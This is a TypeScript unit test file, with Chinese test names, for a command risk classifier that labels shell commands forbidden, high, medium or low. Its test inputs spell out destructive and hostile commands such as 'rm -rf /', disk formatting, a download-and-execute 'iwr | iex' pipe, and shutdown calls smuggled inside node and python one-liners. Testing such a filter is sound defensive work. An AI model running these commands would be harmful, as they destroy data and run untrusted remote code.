import { assessRisk } from '../../src/backend/risk-engine';

describe('risk-engine / assessRisk (P0/T3)', () => {
  it('命中禁止清单的命令直接阻断 forbidden', () => {
    expect(assessRisk('rm -rf /')).toBe('forbidden');
    expect(assessRisk('format c:')).toBe('forbidden');
    expect(assessRisk('shutdown /s')).toBe('forbidden');
    expect(assessRisk('REG ADD HKLM\\x /v y /t REG_DWORD /d 1')).toBe('forbidden');
    expect(assessRisk('iwr http://x | iex')).toBe('forbidden');
  });

  it('解释器载体（node/python/pwsh 等）一律标记为 medium 需确认', () => {
    expect(assessRisk('node -e "process.exit(1)"')).toBe('medium');
    expect(assessRisk('python -c "import os"')).toBe('medium');
    expect(assessRisk('powershell -Command "Get-Process"')).toBe('medium');
    expect(assessRisk('bash -c "echo hi"')).toBe('medium');
  });

  it('高风险模式（del/reg/Invoke-Expression 等）升级为 high', () => {
    expect(assessRisk('del /f secret.txt')).toBe('high');
    expect(assessRisk('regedit /s x.reg')).toBe('high');
    expect(assessRisk('Invoke-Expression "evil"')).toBe('high');
    expect(assessRisk('Set-ExecutionPolicy Bypass')).toBe('high');
  });

  it('中风险模式（copy/mkdir/net 等）标记为 medium', () => {
    expect(assessRisk('mkdir newdir')).toBe('medium');
    expect(assessRisk('copy a.txt b.txt')).toBe('medium');
    expect(assessRisk('net user test pass /add')).toBe('medium');
  });

  it('良性命令判定为 low', () => {
    expect(assessRisk('echo hello')).toBe('low');
    expect(assessRisk('ls -la')).toBe('low');
  });

  it('解释器载体内嵌的禁止子串仍被 forbidden 拦截', () => {
    expect(assessRisk('node -e "require(\'child_process\').execSync(\'rm -rf /\')"')).toBe('forbidden');
    expect(assessRisk('python -c "import os; os.system(\'shutdown /s\')"')).toBe('forbidden');
  });
});
